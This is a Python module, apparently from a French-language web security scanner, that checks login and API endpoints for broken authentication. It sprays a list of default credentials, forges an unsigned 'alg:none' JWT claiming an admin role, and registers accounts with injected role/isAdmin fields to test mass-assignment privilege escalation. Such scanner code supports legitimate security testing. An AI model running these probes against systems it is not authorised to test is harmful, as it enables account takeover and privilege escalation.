"""Authentification cassée : identifiants par défaut sur les endpoints de
login découverts, JWT `alg:none` accepté par un endpoint protégé, et
élévation de privilège par assignation de masse (role/isAdmin à l'inscription).
"""
from __future__ import annotations

import base64
import json

from ..scan_models import Finding
from .base import MAX_TARGETS_PER_MODULE
from ._util import merged_login_targets

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("administrator", "administrator"), ("root", "root"),
    ("test", "test"), ("guest", "guest"),
]

PROTECTED_HINTS = ("me", "profile", "whoami", "account", "user")

# Repli intégré (issu de `techniques.py`) : sondé même sans rien découvert
# par le crawl (SPA peu explorable).
LOGIN_ENDPOINTS = ["/rest/user/login", "/api/login", "/api/auth/login",
                   "/login", "/api/users/login", "/auth/login", "/session"]
PROTECTED_ENDPOINTS = ["/rest/user/whoami", "/api/me", "/api/profile"]
MASS_ASSIGNMENT_ENDPOINTS = ["/api/Users", "/api/users", "/api/register",
                             "/register", "/users"]


def t_default_credentials(ctx) -> list[Finding]:
    """Sonde CHAQUE cible de login découverte/repli et confirme TOUTES les
    instances où des identifiants faibles sont acceptés."""
    out: list[Finding] = []
    targets = merged_login_targets(ctx.sitemap, ctx.origin, LOGIN_ENDPOINTS)
    targets = targets[:MAX_TARGETS_PER_MODULE]
    for action, _fields in targets:
        ref, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        finding = None
        for user, pwd in DEFAULT_CREDS:
            for uf in ("email", "username"):
                st, _, body = ctx.safe_post(action, data={uf: user, "password": pwd})
                low = (body or "").lower()
                if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                    finding = Finding("auth", "default-credentials", "high", action,
                                      f"Identifiants faibles acceptés : {user}/{pwd}",
                                      request=f"POST {action}")
                    break
            if finding:
                break
        if finding:
            out.append(finding)
    return out


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def t_jwt_none_alg(ctx) -> list[Finding]:
    """Sonde CHAQUE endpoint protégé découvert/repli et confirme TOUTES les
    instances où un JWT non signé (alg:none) est accepté."""
    out: list[Finding] = []
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"data": {"email": "pentaster@none.tld"},
                                  "role": "admin", "iat": 0}).encode())
    token = f"{header}.{payload}."
    discovered = [ep.url for ep in list(ctx.sitemap.endpoints) + list(ctx.sitemap.api_endpoints)
                 if any(h in ep.url.lower() for h in PROTECTED_HINTS)]
    base = ctx.origin.rstrip("/")
    builtin = [base + ep for ep in PROTECTED_ENDPOINTS]
    targets = list(dict.fromkeys(discovered + builtin))  # dédupliqué, ordre préservé
    targets = targets[:MAX_TARGETS_PER_MODULE]
    for url in targets:
        st, _, body = ctx.safe_get(url, headers={"Authorization": f"Bearer {token}",
                                                  "Cookie": f"token={token}"})
        if st == 200 and ("none.tld" in (body or "") or "email" in (body or "").lower()):
            out.append(Finding("auth", "jwt-none-algorithm", "high", url,
                               "Un JWT non signé (alg:none) a été accepté",
                               request=f"GET {url}"))
    return out


def t_mass_assignment(ctx) -> list[Finding]:
    """Élévation de privilège via champ role/isAdmin à l'inscription (repli
    intégré, issu de `techniques.py`) : sondé sur TOUS les endpoints de
    (dés)inscription courants, indépendamment du crawl — TOUTES les
    instances confirmées sont remontées."""
    out: list[Finding] = []
    email = f"pentaster_ma_{abs(hash(ctx.origin)) % 99999}@probe.tld"
    for ep in MASS_ASSIGNMENT_ENDPOINTS[:MAX_TARGETS_PER_MODULE]:
        st, _, body = ctx.safe_post(ep, data={"email": email, "password": "Passw0rd!1",
                                              "passwordRepeat": "Passw0rd!1",
                                              "role": "admin", "isAdmin": True})
        low = (body or "").lower().replace(" ", "")
        if st in (200, 201) and ('"role":"admin"' in low or '"isadmin":true' in low):
            out.append(Finding("auth", "mass-assignment-privilege-escalation", "high",
                               ctx.origin.rstrip("/") + ep,
                               "Le champ privilégié (role/isAdmin) a été accepté à l'inscription",
                               request=f"POST {ep}"))
    return out


ATTACKS = [
    ("auth", "Default credentials", t_default_credentials),
    ("auth", "JWT alg:none", t_jwt_none_alg),
    ("auth", "Mass assignment (priv-esc)", t_mass_assignment),
]
